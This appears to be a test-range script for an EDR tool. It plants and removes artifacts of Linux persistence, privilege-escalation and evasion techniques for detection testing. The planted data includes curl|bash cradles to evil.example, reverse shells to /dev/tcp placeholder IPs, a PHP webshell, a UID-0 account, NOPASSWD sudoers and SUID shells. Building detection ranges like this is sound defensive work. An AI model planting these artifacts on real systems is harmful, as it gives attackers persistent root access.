#!/usr/bin/env bash
# bladedr poligon — technique dispatcher.
#
#   techniques.sh <technique-id> <plant|clean> <obvious|stealthy>
#
# Each technique creates (plant) or removes (clean) the agentless ARTIFACT of one
# EDR-T technique — a file, config, account or key that a bladedr rule detects. No
# real malware: we reproduce the artifact at rest, not a working implant.
#
# Two variants share the SAME structural trigger (e.g. "SUID binary in a writable
# dir", "cron line with a curl|bash cradle") and differ only in cosmetic naming:
#   obvious  — bright PoC names (/tmp/.x/evil, "backdoor", rootkit-ish)
#   stealthy — believable names (/var/lib caches, node-metrics, datadog-ish)
# Training on both teaches the model the structure, not the names.
set -u

ID="${1:?technique id}"; ACT="${2:?plant|clean}"; VAR="${3:-obvious}"

obvious() { [ "$VAR" = obvious ]; }
# pick OBVIOUS STEALTHY -> echoes the right one for the current variant
pick() { if obvious; then printf '%s' "$1"; else printf '%s' "$2"; fi; }

CRADLE="$(pick 'curl http://evil.example/x | bash' 'curl -fsSL https://cdn.node-metrics.io/setup | bash')"

# LABDIR holds the helper/probe (set by the orchestrator; /lab in the container,
# /tmp/bladedr-lab over SSH). SUDO is empty as root (container) and "sudo -n" for a
# non-root SSH target with passwordless sudo, so privileged techniques work on both.
LABDIR="${LABDIR:-/lab}"
RUNDIR="$LABDIR/run"; mkdir -p "$RUNDIR"
# As root (container) privileged ops run directly. As a non-root SSH target they go
# through sudo: passwordless if available, else sudo -S reading BLADEDR_SUDO_PW from
# stdin (per-command — nothing persistent is changed on the host).
SUDO=""
if [ "$(id -u)" -ne 0 ]; then SUDO=lab_sudo; fi
lab_sudo() {
  if sudo -n true 2>/dev/null; then sudo -n "$@"
  else printf '%s\n' "${BLADEDR_SUDO_PW:-}" | sudo -S "$@" 2>/dev/null; fi
}

# Runtime techniques need a LIVE process during the scan. bg starts one detached
# (survives this exec session) and records its PID; kill_pid stops it.
bg() { local pf="$1"; shift; nohup "$@" >/dev/null 2>&1 </dev/null & echo $! > "$pf"; sleep 0.6; }
kill_pid() { [ -f "$1" ] && kill "$(cat "$1")" 2>/dev/null; rm -f "$1"; true; }

case "$ID:$ACT" in

# ---- TA0003 Persistence --------------------------------------------------------
cron-cradle:plant)
  mkdir -p /etc/cron.d
  f="$(pick /etc/cron.d/evil /etc/cron.d/node-metrics)"
  printf '*/5 * * * * root %s\n' "$CRADLE" > "$f" ;;
cron-cradle:clean) rm -f /etc/cron.d/evil /etc/cron.d/node-metrics ;;

systemd-service:plant)
  f="$(pick /etc/systemd/system/evil.service /etc/systemd/system/node-metrics.service)"
  exe="$(pick /tmp/.x/payload /var/tmp/.cache/agent)"
  printf '[Service]\nExecStart=%s --daemon\n[Install]\nWantedBy=multi-user.target\n' "$exe" > "$f" ;;
systemd-service:clean) rm -f /etc/systemd/system/evil.service /etc/systemd/system/node-metrics.service ;;

systemd-timer:plant)
  base="$(pick evil node-metrics)"; exe="$(pick /tmp/.x/payload /var/tmp/.cache/agent)"
  printf '[Service]\nExecStart=%s --tick\n' "$exe" > "/etc/systemd/system/$base.service"
  printf '[Timer]\nOnCalendar=*-*-* *:00:00\n[Install]\nWantedBy=timers.target\n' > "/etc/systemd/system/$base.timer" ;;
systemd-timer:clean) rm -f /etc/systemd/system/evil.timer /etc/systemd/system/evil.service \
                           /etc/systemd/system/node-metrics.timer /etc/systemd/system/node-metrics.service ;;

ssh-service-key:plant)
  d=/home/svc-metrics/.ssh; mkdir -p "$d"
  printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI%s implant\n' "$(pick EVIL000000000000000000000000000000000000000 RealLookingKeyMaterial0000000000000000000000)" > "$d/authorized_keys"
  chown -R svc-metrics:svc-metrics "$d" 2>/dev/null || true; chmod 600 "$d/authorized_keys" ;;
ssh-service-key:clean) rm -rf /home/svc-metrics/.ssh ;;

authorized-keys-option:plant)
  d=/root/.ssh; mkdir -p "$d"; chmod 700 "$d"
  opt="$(pick 'environment="LD_PRELOAD=/tmp/.x/evil.so"' 'command="/usr/local/sbin/healthcheck",environment="LD_PRELOAD=/var/lib/.cache/a.so"')"
  printf '%s ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI%s admin\n' "$opt" "$(pick OPT0000000000000000000000000000000000000000 OptRealKeyMaterial000000000000000000000000000)" > "$d/authorized_keys"
  chmod 600 "$d/authorized_keys" ;;
authorized-keys-option:clean) rm -f /root/.ssh/authorized_keys ;;

udev-run:plant)
  f="$(pick /etc/udev/rules.d/99-evil.rules /etc/udev/rules.d/70-node-metrics.rules)"
  # both run from a writable dir (the structural trigger); only the name differs
  run="$(pick /tmp/.x/run.sh /var/tmp/.udev-helper/agent.sh)"; mkdir -p /etc/udev/rules.d
  printf 'ACTION=="add", SUBSYSTEM=="block", RUN+="%s"\n' "$run" > "$f" ;;
udev-run:clean) rm -f /etc/udev/rules.d/99-evil.rules /etc/udev/rules.d/70-node-metrics.rules ;;

shell-rc:plant)
  printf "\nalias ls='ls | grep -v %s'\n" "$(pick evil .cache)" >> /root/.bashrc ;;
shell-rc:clean) sed -i '/grep -v evil/d;/grep -v .cache/d' /root/.bashrc 2>/dev/null || true ;;

python-pth:plant)
  f="$(pick /usr/lib/python3.11/site-packages/evil.pth /usr/lib/python3.11/site-packages/sitecustomize_metrics.pth)"
  printf "import os; os.system('%s')\n" "$(pick 'id' '/usr/local/bin/agent --report')" > "$f" ;;
python-pth:clean) rm -f /usr/lib/python3.11/site-packages/evil.pth /usr/lib/python3.11/site-packages/sitecustomize_metrics.pth ;;

ld-preload:plant)
  printf '%s\n' "$(pick /tmp/.x/evil.so /var/lib/.cache/libmetrics.so)" > /etc/ld.so.preload ;;
ld-preload:clean) rm -f /etc/ld.so.preload ;;

apt-hook:plant)
  f="$(pick /etc/apt/apt.conf.d/99evil /etc/apt/apt.conf.d/99-node-metrics)"; mkdir -p /etc/apt/apt.conf.d
  printf 'DPkg::Pre-Invoke {"%s";};\n' "$CRADLE" > "$f" ;;
apt-hook:clean) rm -f /etc/apt/apt.conf.d/99evil /etc/apt/apt.conf.d/99-node-metrics ;;

pam-backdoor:plant)
  mkdir -p /etc/pam.d
  mod="$(pick /tmp/.x/pam_evil.so /var/lib/.cache/pam_metrics.so)"
  printf 'auth optional %s\n' "$mod" > /etc/pam.d/sshd-poligon ;;
pam-backdoor:clean) rm -f /etc/pam.d/sshd-poligon ;;

dnf-plugin:plant)
  d=/usr/lib/python3/dist-packages/dnf-plugins; mkdir -p "$d"
  f="$(pick "$d/evil.py" "$d/metrics.py")"
  printf 'import os\n' > "$f"; chmod 666 "$f" ;;   # world-writable plugin
dnf-plugin:clean) rm -rf /usr/lib/python3/dist-packages/dnf-plugins ;;

# ---- TA0004 Privilege Escalation ----------------------------------------------
uid0-account:plant)
  name="$(pick toor svc-sync)"
  groupadd -g 0 -o "$name" 2>/dev/null || true
  useradd -o -u 0 -g 0 -M -s /bin/bash "$name" 2>/dev/null || \
    printf '%s:x:0:0::/root:/bin/bash\n' "$name" >> /etc/passwd ;;
uid0-account:clean) sed -i '/^toor:/d;/^svc-sync:/d' /etc/passwd 2>/dev/null || true ;;

sudoers:plant)
  mkdir -p /etc/sudoers.d
  f="$(pick /etc/sudoers.d/evil /etc/sudoers.d/deploy-ci)"
  printf '%s ALL=(ALL) NOPASSWD: ALL\n' "$(pick baduser deploy)" > "$f"; chmod 440 "$f" ;;
sudoers:clean) rm -f /etc/sudoers.d/evil /etc/sudoers.d/deploy-ci ;;

suid-writable:plant)
  f="$(pick /tmp/.x/rootshell /var/tmp/.fontcache/upd)"; mkdir -p "$(dirname "$f")"
  cp /bin/bash "$f" 2>/dev/null && chmod 4755 "$f" ;;
suid-writable:clean) rm -rf /tmp/.x/rootshell /var/tmp/.fontcache ;;

nfs-export:plant)
  printf '%s *(rw,sync,no_root_squash)\n' "$(pick /srv/evil /srv/backups)" > /etc/exports ;;
nfs-export:clean) rm -f /etc/exports ;;

# ---- TA0005 Defense Evasion ---------------------------------------------------
hidden-exec:plant)
  f="$(pick /tmp/.x/.hidden /dev/shm/.systemd-private)"; mkdir -p "$(dirname "$f")"
  cp /bin/true "$f" 2>/dev/null && chmod 755 "$f" ;;
hidden-exec:clean) rm -rf /tmp/.x /dev/shm/.systemd-private ;;

history-disabled:plant)
  printf '\nexport HISTFILE=/dev/null\n' >> "$(pick /root/.bashrc /home/deploy/.bashrc)" ;;
history-disabled:clean) sed -i '/HISTFILE=\/dev\/null/d' /root/.bashrc /home/deploy/.bashrc 2>/dev/null || true ;;

log-symlink:plant)
  rm -f /var/log/auth.log; ln -s /dev/null /var/log/auth.log ;;
log-symlink:clean) rm -f /var/log/auth.log ;;

sysctl-hardening:plant)
  mkdir -p /etc/sysctl.d
  f="$(pick /etc/sysctl.d/99-evil.conf /etc/sysctl.d/60-node-tuning.conf)"
  printf 'kernel.yama.ptrace_scope = 0\n' > "$f" ;;
sysctl-hardening:clean) rm -f /etc/sysctl.d/99-evil.conf /etc/sysctl.d/60-node-tuning.conf ;;

selinux-disabled:plant)
  mkdir -p /etc/selinux
  printf 'SELINUX=%s\nSELINUXTYPE=targeted\n' "$(pick disabled permissive)" > /etc/selinux/config ;;
selinux-disabled:clean) rm -f /etc/selinux/config ;;

# ---- TA0003 Persistence (batch 2) ---------------------------------------------
cron-gtfobins:plant)
  mkdir -p /etc/cron.d
  f="$(pick /etc/cron.d/evilcmd /etc/cron.d/metrics-report)"
  printf "*/10 * * * * root %s\n" "$(pick "python3 -c 'import os'" "perl -e 'exec \"/bin/sh\"'")" > "$f" ;;
cron-gtfobins:clean) rm -f /etc/cron.d/evilcmd /etc/cron.d/metrics-report ;;

sshd-backdoor:plant)
  mkdir -p /etc/ssh
  printf 'ForceCommand %s\n' "$(pick /tmp/.x/login.sh /var/tmp/.cache/login.sh)" > /etc/ssh/sshd_config ;;
sshd-backdoor:clean) rm -f /etc/ssh/sshd_config ;;

supervisor:plant)
  mkdir -p /etc/supervisor/conf.d
  f="$(pick /etc/supervisor/conf.d/evil.conf /etc/supervisor/conf.d/metrics.conf)"
  printf '[program:%s]\ncommand=%s --daemon\n' "$(pick evil metrics)" "$(pick /tmp/.x/run /var/tmp/.cache/run)" > "$f" ;;
supervisor:clean) rm -f /etc/supervisor/conf.d/evil.conf /etc/supervisor/conf.d/metrics.conf ;;

modprobe-cmd:plant)
  mkdir -p /etc/modprobe.d
  f="$(pick /etc/modprobe.d/evil.conf /etc/modprobe.d/node-tuning.conf)"
  printf 'install dummy %s\n' "$(pick /tmp/.x/run.sh /var/tmp/.cache/run.sh)" > "$f" ;;
modprobe-cmd:clean) rm -f /etc/modprobe.d/evil.conf /etc/modprobe.d/node-tuning.conf ;;

ldsoconf:plant)
  mkdir -p /etc/ld.so.conf.d "$(pick /tmp/lib /var/tmp/.cache/lib)"
  f="$(pick /etc/ld.so.conf.d/evil.conf /etc/ld.so.conf.d/node-libs.conf)"
  printf '%s\n' "$(pick /tmp/lib /var/tmp/.cache/lib)" > "$f" ;;
ldsoconf:clean) rm -f /etc/ld.so.conf.d/evil.conf /etc/ld.so.conf.d/node-libs.conf ;;

global-ldpreload:plant)
  printf 'LD_PRELOAD=%s\n' "$(pick /tmp/.x/evil.so /var/tmp/.cache/lib.so)" >> /etc/environment ;;
global-ldpreload:clean) sed -i '/^LD_PRELOAD=/d' /etc/environment 2>/dev/null || true ;;

systemd-execpre:plant)
  f="$(pick /etc/systemd/system/evilpre.service /etc/systemd/system/node-pre.service)"
  printf '[Service]\nExecStartPre=%s\nExecStart=/usr/bin/true\n' "$(pick /tmp/.x/setup.sh /var/tmp/.cache/setup.sh)" > "$f" ;;
systemd-execpre:clean) rm -f /etc/systemd/system/evilpre.service /etc/systemd/system/node-pre.service ;;

systemd-revshell:plant)
  f="$(pick /etc/systemd/system/evilsh.service /etc/systemd/system/node-health.service)"
  printf "[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/%s/4444 0>&1'\n" "$(pick 10.0.0.1 198.51.100.7)" > "$f" ;;
systemd-revshell:clean) rm -f /etc/systemd/system/evilsh.service /etc/systemd/system/node-health.service ;;

startup-cradle:plant)
  mkdir -p /etc/profile.d
  f="$(pick /etc/profile.d/00-evil.sh /etc/profile.d/00-node-metrics.sh)"
  printf '%s\n' "$CRADLE" > "$f" ;;
startup-cradle:clean) rm -f /etc/profile.d/00-evil.sh /etc/profile.d/00-node-metrics.sh ;;

at-cradle:plant)
  mkdir -p /var/spool/cron/atjobs
  f="$(pick /var/spool/cron/atjobs/a0001 /var/spool/cron/atjobs/a0002)"
  printf '#!/bin/sh\n%s\n' "$CRADLE" > "$f" ;;
at-cradle:clean) rm -f /var/spool/cron/atjobs/a0001 /var/spool/cron/atjobs/a0002 ;;

initramfs:plant)
  mkdir -p /etc/initramfs-tools/hooks
  f="$(pick /etc/initramfs-tools/hooks/99-evil /etc/initramfs-tools/hooks/zz-node-metrics)"
  printf '#!/bin/sh\nbash -i >& /dev/tcp/%s/4444 0>&1\n' "$(pick 10.0.0.1 198.51.100.7)" > "$f" ;;
initramfs:clean) rm -f /etc/initramfs-tools/hooks/99-evil /etc/initramfs-tools/hooks/zz-node-metrics ;;

xdg-autostart:plant)
  mkdir -p /etc/xdg/autostart
  f="$(pick /etc/xdg/autostart/evil.desktop /etc/xdg/autostart/node-metrics.desktop)"
  printf '[Desktop Entry]\nType=Application\nExec=%s\n' "$(pick /tmp/.x/run.sh /var/tmp/.cache/run.sh)" > "$f" ;;
xdg-autostart:clean) rm -f /etc/xdg/autostart/evil.desktop /etc/xdg/autostart/node-metrics.desktop ;;

ssh-localcommand:plant)
  mkdir -p /root/.ssh; chmod 700 /root/.ssh
  printf 'Host *\n  PermitLocalCommand yes\n  LocalCommand %s\n' "$(pick /tmp/.x/run.sh /var/tmp/.cache/run.sh)" > /root/.ssh/config ;;
ssh-localcommand:clean) rm -f /root/.ssh/config ;;

nsswitch:plant)
  printf 'passwd: files %s\ngroup: files\n' "$(pick backdoor metrics)" > /etc/nsswitch.conf ;;
nsswitch:clean) rm -f /etc/nsswitch.conf ;;

pam-exec:plant)
  mkdir -p /etc/pam.d
  printf 'auth optional pam_exec.so expose_authtok %s\n' "$(pick /tmp/.x/log.sh /var/tmp/.cache/log.sh)" > /etc/pam.d/sshd-poligon2 ;;
pam-exec:clean) rm -f /etc/pam.d/sshd-poligon2 ;;

# ---- TA0003/web + supply-chain ------------------------------------------------
webshell:plant)
  mkdir -p /var/www/html
  f="$(pick /var/www/html/shell.php /var/www/html/uploads_handler.php)"
  printf '<?php system($_GET["cmd"]); ?>\n' > "$f" ;;
webshell:clean) rm -rf /var/www/html ;;

web-module:plant)
  mkdir -p /etc/apache2/mods-enabled
  f="$(pick /etc/apache2/mods-enabled/evil.load /etc/apache2/mods-enabled/metrics.load)"
  printf 'LoadModule %s_module %s\n' "$(pick evil metrics)" "$(pick /tmp/.x/mod.so /var/tmp/.cache/mod.so)" > "$f" ;;
web-module:clean) rm -f /etc/apache2/mods-enabled/evil.load /etc/apache2/mods-enabled/metrics.load ;;

apt-unverified:plant)
  mkdir -p /etc/apt/sources.list.d
  f="$(pick /etc/apt/sources.list.d/evil.list /etc/apt/sources.list.d/node-metrics.list)"
  printf 'deb [trusted=yes] http://%s/debian ./\n' "$(pick evil.example cdn.node-metrics.io)" > "$f" ;;
apt-unverified:clean) rm -f /etc/apt/sources.list.d/evil.list /etc/apt/sources.list.d/node-metrics.list ;;

# ---- TA0004 Privilege Escalation (batch 2) ------------------------------------
passwordless:plant)
  name="$(pick ghost svc-backup)"
  useradd -m "$name" 2>/dev/null || true; passwd -d "$name" >/dev/null 2>&1 || \
    sed -i "s|^$name:[^:]*:|$name::|" /etc/shadow 2>/dev/null || true ;;
passwordless:clean) userdel -r ghost 2>/dev/null; userdel -r svc-backup 2>/dev/null; true ;;

privgroup:plant)
  groupadd docker 2>/dev/null || true; usermod -aG docker svc-metrics 2>/dev/null || true ;;
privgroup:clean) gpasswd -d svc-metrics docker 2>/dev/null || true; true ;;

sudo-gtfobins:plant)
  mkdir -p /etc/sudoers.d
  f="$(pick /etc/sudoers.d/evilfind /etc/sudoers.d/deploy-find)"
  printf '%s ALL=(root) NOPASSWD: /usr/bin/find\n' "$(pick baduser deploy)" > "$f"; chmod 440 "$f" ;;
sudo-gtfobins:clean) rm -f /etc/sudoers.d/evilfind /etc/sudoers.d/deploy-find ;;

sudo-envkeep:plant)
  mkdir -p /etc/sudoers.d
  f="$(pick /etc/sudoers.d/evilenv /etc/sudoers.d/build-env)"
  printf 'Defaults env_keep += "LD_PRELOAD"\n' > "$f"; chmod 440 "$f" ;;
sudo-envkeep:clean) rm -f /etc/sudoers.d/evilenv /etc/sudoers.d/build-env ;;

cron-path-hijack:plant)
  mkdir -p /etc/cron.d
  f="$(pick /etc/cron.d/evilpath /etc/cron.d/metrics-path)"
  printf 'PATH=%s:/usr/bin\n*/5 * * * * root backup.sh\n' "$(pick /tmp/bin /var/tmp/.cache/bin)" > "$f" ;;
cron-path-hijack:clean) rm -f /etc/cron.d/evilpath /etc/cron.d/metrics-path ;;

# ---- TA0007 K8s node ----------------------------------------------------------
k8s-static-pod:plant)
  mkdir -p /etc/kubernetes/manifests
  f="$(pick /etc/kubernetes/manifests/evil.yaml /etc/kubernetes/manifests/node-exporter.yaml)"
  printf 'apiVersion: v1\nkind: Pod\nspec:\n  hostPID: true\n  containers:\n  - name: x\n    securityContext:\n      privileged: true\n    volumeMounts:\n    - mountPath: /host\n  volumes:\n  - hostPath:\n      path: /\n' > "$f" ;;
k8s-static-pod:clean) rm -f /etc/kubernetes/manifests/evil.yaml /etc/kubernetes/manifests/node-exporter.yaml ;;

k8s-kubeconfig:plant)
  mkdir -p /etc/kubernetes
  printf 'apiVersion: v1\nkind: Config\nusers:\n- user:\n    client-key-data: SECRET\n    token: abc.def.ghi\n' > /etc/kubernetes/admin.conf
  chmod 644 /etc/kubernetes/admin.conf ;;
k8s-kubeconfig:clean) rm -f /etc/kubernetes/admin.conf ;;

# ---- Wave #1: RUNTIME techniques (live process/socket during the scan) --------
# $LABDIR/helper is the static runtime helper (poligon/helpers/runtime), copied in by
# the orchestrator. Spoofed-argv cases exec it under a fake argv via `exec -a`; it
# ignores unknown args and just sleeps, holding the spoofed identity.
deleted-binary:plant)
  b="$(pick /run/.x/payload /opt/.cache/agent)"; mkdir -p "$(dirname "$b")"
  cp $LABDIR/helper "$b"; bg "$RUNDIR/deleted-binary.pid" "$b"; rm -f "$b" ;;   # exe now deleted, proc lives
deleted-binary:clean) kill_pid "$RUNDIR/deleted-binary.pid"; rm -rf /run/.x /opt/.cache ;;

exec-world-writable:plant)
  # /dev/shm is mounted noexec in Docker, so the stealthy path uses /var/tmp (also
  # in the rule's writable set) to keep the structural trigger while staying execable.
  b="$(pick /tmp/.x/run /var/tmp/.cache/run)"; mkdir -p "$(dirname "$b")"
  cp $LABDIR/helper "$b"; bg "$RUNDIR/exec-ww.pid" "$b" ;;
exec-world-writable:clean) kill_pid "$RUNDIR/exec-ww.pid"; rm -rf /tmp/.x /var/tmp/.cache ;;

masquerade:plant)
  b="$(pick '/run/[kworker:9:0]' /run/kworker_helper)"
  cp $LABDIR/helper "$b"; bg "$RUNDIR/masquerade.pid" "$b" ;;   # comm = basename, contains "kworker"
masquerade:clean) kill_pid "$RUNDIR/masquerade.pid"; rm -f '/run/[kworker:9:0]' /run/kworker_helper ;;

empty-environ:plant)
  b=/run/svc-agent; cp $LABDIR/helper "$b"; bg "$RUNDIR/empty-environ.pid" env -i "$b" ;;
empty-environ:clean) kill_pid "$RUNDIR/empty-environ.pid"; rm -f /run/svc-agent ;;

revshell-proc:plant)
  rs="bash -i >& /dev/tcp/$(pick 10.0.0.1 198.51.100.7)/4444 0>&1"
  bg "$RUNDIR/revshell.pid" bash -c "exec -a '$rs' $LABDIR/helper" ;;   # cmdline = the reverse-shell string
revshell-proc:clean) kill_pid "$RUNDIR/revshell.pid" ;;

ssh-tunnel-proc:plant)
  bg "$RUNDIR/ssh-tunnel.pid" bash -c "exec -a ssh $LABDIR/helper -fND $(pick 1080 9050) jump@10.0.0.5" ;;
ssh-tunnel-proc:clean) kill_pid "$RUNDIR/ssh-tunnel.pid" ;;

port-listener:plant)
  bg "$RUNDIR/listener.pid" $LABDIR/helper --listen "$(pick 4444 31337)" ;;
port-listener:clean) kill_pid "$RUNDIR/listener.pid" ;;

packet-sniffer:plant)
  bg "$RUNDIR/packet.pid" $LABDIR/helper --packet ;;
packet-sniffer:clean) kill_pid "$RUNDIR/packet.pid" ;;

miner-c2:plant)
  bg "$RUNDIR/miner.pid" $LABDIR/helper --connect "$(pick 3333 5555)" ;;
miner-c2:clean) kill_pid "$RUNDIR/miner.pid" ;;

memfd-exec:plant)
  bg "$RUNDIR/memfd.pid" $LABDIR/helper --memfd ;;
memfd-exec:clean) kill_pid "$RUNDIR/memfd.pid" ;;

# ---- Remaining agentless (caps / SUID / writable / supply-chain) --------------
file-cap:plant)
  f="$(pick /tmp/.x/capbin /var/tmp/.cache/capbin)"; mkdir -p "$(dirname "$f")"
  cp /bin/true "$f"; setcap cap_net_raw+ep "$f" 2>/dev/null || true ;;
file-cap:clean) rm -rf /tmp/.x /var/tmp/.cache ;;

dangerous-cap:plant)
  f="$(pick /usr/local/bin/evilcap /usr/local/bin/node-helper)"
  cp /bin/true "$f"; setcap cap_setuid+ep "$f" 2>/dev/null || true ;;
dangerous-cap:clean) rm -f /usr/local/bin/evilcap /usr/local/bin/node-helper ;;

suid-shell:plant)
  f="$(pick /usr/local/sbin/bash /usr/local/bin/bash)"  # basename must be a GTFOBins name
  cp /bin/bash "$f" 2>/dev/null && chmod 4755 "$f" ;;
suid-shell:clean) rm -f /usr/local/sbin/bash /usr/local/bin/bash ;;

writable-suid:plant)
  f="$(pick /usr/local/bin/evilupd /usr/local/bin/updhelper)"
  cp /bin/true "$f" && chmod 6777 "$f" ;;   # SUID/SGID + world-writable
writable-suid:clean) rm -f /usr/local/bin/evilupd /usr/local/bin/updhelper ;;

world-writable:plant) chmod o+w /etc/passwd ;;
world-writable:clean) chmod o-w /etc/passwd 2>/dev/null || true ;;

writable-persist:plant)
  f="$(pick /etc/systemd/system/evilw.service /etc/systemd/system/node-w.service)"
  printf '[Service]\nExecStart=/usr/bin/true\n' > "$f"; chmod o+w "$f" ;;
writable-persist:clean) rm -f /etc/systemd/system/evilw.service /etc/systemd/system/node-w.service ;;

login-shell:plant)
  useradd -M -s "$(pick /tmp/.x/sh /var/tmp/.cache/sh)" "$(pick evillogin svc-login)" 2>/dev/null || true ;;
login-shell:clean) userdel evillogin 2>/dev/null; userdel svc-login 2>/dev/null; true ;;

systemd-unit-ldpreload:plant)
  f="$(pick /etc/systemd/system/evilpl.service /etc/systemd/system/node-pl.service)"
  printf '[Service]\nEnvironment=LD_PRELOAD=%s\nExecStart=/usr/bin/true\n' "$(pick /tmp/.x/p.so /var/tmp/.cache/p.so)" > "$f" ;;
systemd-unit-ldpreload:clean) rm -f /etc/systemd/system/evilpl.service /etc/systemd/system/node-pl.service ;;

offensive-tool:plant)
  f="$(pick /tmp/.x/scan /var/tmp/.cache/tool)"; mkdir -p "$(dirname "$f")"
  printf 'package main\nimport _ "github.com/%s"\n' "$(pick jpillora/chisel fatedier/frp)" > "$f" ;;
offensive-tool:clean) rm -rf /tmp/.x /var/tmp/.cache ;;

liblzma-backdoor:plant)
  ver="$(pick 5.6.1 5.6.0)"
  : > "/usr/lib/liblzma.so.$ver"; ln -sf "liblzma.so.$ver" /usr/lib/liblzma.so.5 ;;
liblzma-backdoor:clean) rm -f /usr/lib/liblzma.so.5 /usr/lib/liblzma.so.5.6.0 /usr/lib/liblzma.so.5.6.1 ;;

docker-socket:plant)
  mkdir -p /run; : > /run/docker.sock; chmod 0666 /run/docker.sock ;;
docker-socket:clean) rm -f /run/docker.sock ;;

# ---- Wave #2: privileged (need root + a real host; run on the SSH target) -----
# All reversible. $SUDO is "sudo -n" on a non-root target, empty as container root.
immutable-file:plant)
  # /etc/ld.so.preload is in the rule's sensitive set and is normally absent, so
  # creating + chattr+i then -i + rm is fully reversible and touches nothing real.
  $SUDO touch /etc/ld.so.preload; $SUDO chattr +i /etc/ld.so.preload 2>/dev/null || true ;;
immutable-file:clean)
  $SUDO chattr -i /etc/ld.so.preload 2>/dev/null; $SUDO rm -f /etc/ld.so.preload; true ;;

binfmt-register:plant)
  $SUDO sh -c 'mountpoint -q /proc/sys/fs/binfmt_misc 2>/dev/null || mount -t binfmt_misc none /proc/sys/fs/binfmt_misc' 2>/dev/null || true
  interp="$(pick /tmp/.x/interp /var/tmp/.cache/interp)"; $SUDO mkdir -p "$(dirname "$interp")"; $SUDO cp /bin/true "$interp"
  # write the register entry inside sudo (lab_sudo consumes stdin for the password,
  # so the magic string must go via `sh -c >`, not a pipe into `sudo tee`).
  $SUDO sh -c "printf ':evilfmt:E::evilx::%s:\n' '$interp' > /proc/sys/fs/binfmt_misc/register" 2>/dev/null || true ;;
binfmt-register:clean)
  $SUDO sh -c 'echo -1 > /proc/sys/fs/binfmt_misc/evilfmt' 2>/dev/null || true
  $SUDO rm -rf /tmp/.x /var/tmp/.cache ;;

proc-bind-mount:plant)
  # needs SELinux permissive/off: an enforcing policy denies bind-mounting over /proc/<pid>.
  nohup sleep 600 >/dev/null 2>&1 </dev/null & echo $! > "$RUNDIR/pbm.pid"; sleep 0.3
  p=$(cat "$RUNDIR/pbm.pid"); $SUDO mount --bind /tmp "/proc/$p" 2>/dev/null || true ;;
proc-bind-mount:clean)
  p=$(cat "$RUNDIR/pbm.pid" 2>/dev/null); [ -n "$p" ] && { $SUDO umount "/proc/$p" 2>/dev/null; kill "$p" 2>/dev/null; }
  rm -f "$RUNDIR/pbm.pid"; true ;;

# ---- Wave #2: kernel-state (need root + a real host; reversible, run via --target)
# Each saves the original value and restores it on clean. No modules, no crashes.
core-pattern:plant)
  $SUDO sh -c "cat /proc/sys/kernel/core_pattern > '$RUNDIR/core_pattern.orig'" 2>/dev/null || true
  $SUDO sh -c "printf '|%s %%P\n' '$(pick /tmp/.x/collect /var/tmp/.cache/collect)' > /proc/sys/kernel/core_pattern" 2>/dev/null || true ;;
core-pattern:clean)
  [ -s "$RUNDIR/core_pattern.orig" ] && $SUDO sh -c "cat '$RUNDIR/core_pattern.orig' > /proc/sys/kernel/core_pattern" 2>/dev/null
  rm -f "$RUNDIR/core_pattern.orig"; true ;;

yama-runtime:plant)
  $SUDO sh -c "cat /proc/sys/kernel/yama/ptrace_scope > '$RUNDIR/yama.orig'" 2>/dev/null || true
  $SUDO sh -c 'echo 0 > /proc/sys/kernel/yama/ptrace_scope' 2>/dev/null || true ;;
yama-runtime:clean)
  [ -s "$RUNDIR/yama.orig" ] && $SUDO sh -c "cat '$RUNDIR/yama.orig' > /proc/sys/kernel/yama/ptrace_scope" 2>/dev/null
  rm -f "$RUNDIR/yama.orig"; true ;;

# ---- Benign-but-flagged NEGATIVES (calibrate ambiguous-rule precision) --------
# Same structural artifact as a real attack, but a legitimate intent — so the model
# learns these medium/ambiguous rules are lower-precision (the negative class).
benign-sysctl-dev:plant)
  mkdir -p /etc/sysctl.d
  printf '# loosen ptrace for local debugging in this dev box\nkernel.yama.ptrace_scope = 0\n' > /etc/sysctl.d/90-dev-debug.conf ;;
benign-sysctl-dev:clean) rm -f /etc/sysctl.d/90-dev-debug.conf ;;

benign-ci-docker:plant)
  groupadd docker 2>/dev/null || true; usermod -aG docker svc-metrics 2>/dev/null || true ;;
benign-ci-docker:clean) gpasswd -d svc-metrics docker 2>/dev/null || true; true ;;

benign-dev-path:plant)
  printf 'PATH="/usr/local/bin:/usr/bin:."\n' > /etc/profile ;;  # dev convenience: cwd in PATH
benign-dev-path:clean) rm -f /etc/profile ;;

benign-home-service:plant)
  f="$(pick /etc/systemd/system/ci-runner.service /etc/systemd/system/gitlab-runner.service)"
  printf '[Service]\nExecStart=%s\n[Install]\nWantedBy=multi-user.target\n' "$(pick /home/deploy/actions-runner/run.sh /home/gitlab-runner/builds/run.sh)" > "$f" ;;
benign-home-service:clean) rm -f /etc/systemd/system/ci-runner.service /etc/systemd/system/gitlab-runner.service ;;

benign-supervisor-port:plant)
  bg "$RUNDIR/benign-port.pid" $LABDIR/helper --listen 9001 ;;   # supervisord web UI uses 9001
benign-supervisor-port:clean) kill_pid "$RUNDIR/benign-port.pid" ;;

*) echo "unknown technique/action: $ID:$ACT" >&2; exit 2 ;;
esac
